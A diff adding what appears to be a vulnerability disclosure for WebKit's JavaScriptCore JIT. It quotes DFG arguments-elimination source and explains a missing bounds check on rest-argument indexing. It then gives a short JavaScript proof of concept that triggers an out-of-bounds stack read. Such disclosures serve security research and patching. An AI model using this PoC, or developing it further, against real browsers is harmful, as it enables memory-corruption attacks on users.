@@ -1,0 +1,63 @@
+https://github.com/WebKit/webkit/blob/94e868c940d46c5745869192d07255331d00102b/Source/JavaScriptCore/dfg/DFGArgumentsEliminationPhase.cpp#L743
+
+case GetByVal: {
+    ...
+
+    unsigned numberOfArgumentsToSkip = 0;
+    if (candidate->op() == PhantomCreateRest)
+        numberOfArgumentsToSkip = candidate->numberOfArgumentsToSkip();
+    
+    Node* result = nullptr;
+    if (m_graph.varArgChild(node, 1)->isInt32Constant()) {
+        unsigned index = m_graph.varArgChild(node, 1)->asUInt32();                        
+        InlineCallFrame* inlineCallFrame = candidate->origin.semantic.inlineCallFrame();
+        index += numberOfArgumentsToSkip;
+        
+        bool safeToGetStack;
+        if (inlineCallFrame) {
+            safeToGetStack = index < inlineCallFrame->argumentCountIncludingThis - 1;
+
+        }
+        else {
+            safeToGetStack =
+                index < static_cast<unsigned>(codeBlock()->numParameters()) - 1;
+
+        }
+        if (safeToGetStack) {
+            StackAccessData* data;
+            VirtualRegister arg = virtualRegisterForArgument(index + 1);
+            if (inlineCallFrame)
+                arg += inlineCallFrame->stackOffset;
+
+            data = m_graph.m_stackAccessData.add(arg, FlushedJSValue);
+            
+            Node* check = nullptr;
+            if (!inlineCallFrame || inlineCallFrame->isVarargs()) {
+                check = insertionSet.insertNode(
+                    nodeIndex, SpecNone, CheckInBounds, node->origin,
+                    m_graph.varArgChild(node, 1), Edge(getArrayLength(candidate), Int32Use));
+            }
+            
+            result = insertionSet.insertNode(
+                nodeIndex, node->prediction(), GetStack, node->origin, OpInfo(data), Edge(check, UntypedUse));
+        }
+    }
+
+The above code is trying to inline GetByVal operations on stack-allocated arguments. The problem is, it doesn't check whether "index" is lower than "numberOfArgumentsToSkip", i.e., "index" was overflowed. This bug is exploitable as this can lead to uninitialized variable access under certain circumstances.
+
+PoC:
+function inlinee(index, value, ...rest) {
+    return rest[index | 0];  // GetByVal
+}
+
+function opt() {
+    return inlinee(-1, 0x1234);  // or inlinee(0xffffffff, 0x1234)
+}
+
+inlinee(0, 0);
+
+for (let i = 0; i < 1000000; i++) {
+    opt();
+}
+
+print(opt());  // 0x1234
